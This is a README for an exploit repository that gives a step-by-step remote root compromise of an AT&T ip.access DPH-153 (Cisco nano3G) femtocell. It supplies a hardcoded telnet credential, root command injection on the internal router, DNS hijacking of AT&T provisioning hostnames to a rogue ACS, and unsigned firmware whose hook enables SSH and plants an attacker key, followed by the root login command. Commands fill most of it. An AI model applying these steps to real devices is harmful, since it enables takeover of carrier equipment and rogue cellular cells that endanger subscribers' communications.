# DPH153-AT

Remote root on an AT&T ip.access DPH-153 (Cisco nano3G) femtocell over CWMP, then
bringing its 3G cell up on your own core.

## Lab addressing (example)

These are the addresses this was built on; substitute your own.

| Address | Role |
|---|---|
| `192.168.157.186` | PICO / NodeB - the femto itself (where you get root) |
| `192.168.157.185` | Ralink router SoC inside the unit - the PICO's DNS resolver and NAT gateway |
| `192.168.157.184/30` | the unit's internal subnet (route to it from your workstation) |
| `10.179.1.203` | ACS (CWMP / TR-069) |
| `10.179.1.202` | CMHS (XMPP provisioning) - must be a different IP from the ACS |
| `10.5.198.200` | NTP server (oscillator discipline; the cell will not key TX without it) |
| `10.5.198.115` | the PICO's source IP as the core sees it (NAT'd through the Ralink) |

How the addresses are used: the PICO talks only to the Ralink. The Ralink is its DNS
resolver (`dnrd`) and NATs it onto the core network as `10.5.198.115`. The PICO resolves
the baked-in AT&T hostnames; your DNS points those at your ACS/CMHS IPs. It is provisioned
by the CMHS over XMPP, then Informs the ACS, which hands it the exploit firmware. Once
rooted, it registers its 3G cell to your HNBGW and disciplines its oscillator from the NTP
server.

## ACS and CMHS must be on separate IPs

The femto sends no TLS SNI, so a server cannot tell an ACS connection from a CMHS one on a
single address. `acs_tr069.py` selects the handler (and matching cert) purely by the
DESTINATION IP the femto dialed, so the two have to live on different IPs and DNS must send
each hostname to the matching one:

    femtocell.wireless.att.com       ->  10.179.1.203   (ACS / CWMP)
    cmhsse-decatur.wireless.att.com  ->  10.179.1.202   (CMHS / XMPP)

Put both IPs on the ACS host (an `eth0` alias for the second) and the one server binds both.

## 1. Access the Ralink, set DNS

The PICO never uses your DNS directly. It queries the Ralink, which runs `dnrd` (a DNS
relay). Two parts: point that relay at your DNS server, and put the FQDN records on that
server.

Telnet to `192.168.157.185` as `guest` / `1qaz@WSX`. Run commands as root via:

    rmm_client 192.168.157.185 cs_cmd "<command>"

Re-point the relay:

    rmm_client 192.168.157.185 cs_cmd "killall dnrd; dnrd -s 10.179.1.202 -a 192.168.157.185 -u guest"

This kills the stock relay (which forwards to AT&T's own DNS, so the PICO would find the
real ACS) and restarts it forwarding every query to `10.179.1.202` (`-s`, your DNS box),
listening on the Ralink's IP `192.168.157.185` (`-a`, what the PICO queries), as user
`guest` (`-u`). `dnrd` holds no records itself - it only changes WHERE the PICO's lookups
go. It reverts on every PICO power-cycle; re-run it. Helpers: `rroot.py '<cmd>'` (injects
passwordless root, returns output), `rl.py '<cmd>'`.

### DNS records

Set the FQDNs on the box `dnrd` forwards to (`10.179.1.202`). This repo ships the BIND zone
under `bind/`:

    cp bind/db.att /etc/bind/db.att
    cat bind/named.conf.local.snippet >> /etc/bind/named.conf.local
    systemctl restart named            # or bind9

It maps `femtocell -> .203`, `cmhsse-decatur -> .202`, and `* -> .202`. Verify:
`dig +short @10.179.1.202 femtocell.wireless.att.com` -> `10.179.1.203`.

## 2. Fire up the ACS and CWMP / XMPP server

`acs/acs_tr069.py` is one TLS server on `:443` serving both contexts (by destination IP,
above). Its certs sit next to it in `acs/`: the self-signed server key/leaf (`leaf.key`,
`chain20{2,3}.pem`) and the genuine ip.access/Cisco CA bundle (`cisco_clientca.pem`) used to
verify the femto's own client cert.

    pip install -r requirements.txt
    OPENSSL_CONF=acs/legacy.cnf python3 acs/acs_tr069.py

Edit the config block at the top of `acs/acs_tr069.py` for your deployment: `SDP_URL`,
`SDP_SIZE`, and the `CTX` dict keys (your ACS `.203` / CMHS `.202` IPs).

Serve the firmware over HTTP separately, matching `SDP_URL`:

    python3 -m http.server 8080        # from a directory containing rmm-selfclean.sdp

Arm the exploit download (send-once): `touch acs/.selfclean_arm; rm -f acs/.selfclean_sent`.
On the next Inform the ACS sends a `Download`; the femto fetches the firmware and applies it.
The femto accepts the self-signed cert (stock-firmware weakness); no CA work needed.

## 3. Custom firmware

`rmm-selfclean.sdp` is a hook-only ip.access `.SDP` (signing is off on this build). The CWMP
`Download` runs `selfclean_hook.sh` as root: it tears down the upgrade transaction (no reboot
loop), enables the stock sshd on `0.0.0.0:22` via nv_env, and installs `cwmp_rce_key.pub`.
The filename must start with `rmm-` or the femto rejects it (fault 9003). See FIRMWARE.md for how the `.SDP` is built.

## 4. Log in as root

    ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa \
        -o PubkeyAcceptedKeyTypes=+ssh-rsa -o Ciphers=+aes128-cbc \
        -i cwmp_rce_key root@192.168.157.186

No sftp on the unit; pull files with `ssh ... 'cat /path'`.

## 5. Logs

- Firmware/hook: `/var/ipaccess/selfclean_hook.log`, `/var/ipaccess/cwmp_rce_proof_persist`
- Femto manager: `/var/ipaccess/mgr_app.log`, `/var/log/messages`
- ACS / CMHS: `/var/log/acs_tr069.log` (request bodies in `/var/log/acs_bodies.log`), and stdout

## Files

- `cwmp_rce_key`, `cwmp_rce_key.pub` - SSH keypair baked into the firmware
- `rmm-selfclean.sdp` - the RCE firmware image
- `selfclean_hook.sh` - the root hook it runs
- `sdp_pack.py` - the `.SDP` packer (build: `python3 sdp_pack.py selfclean_hook.sh rmm-selfclean.sdp`)
- `FIRMWARE.md` - how the firmware is built
- `acs/` - ACS + CMHS (XMPP) server and its TLS certs + `legacy.cnf`
- `bind/` - DNS zone (`db.att`) + `named.conf.local` snippet
- `rroot.py`, `rl.py` - Ralink root helpers (need `pexpect`)
- `requirements.txt` - `pip install -r requirements.txt`
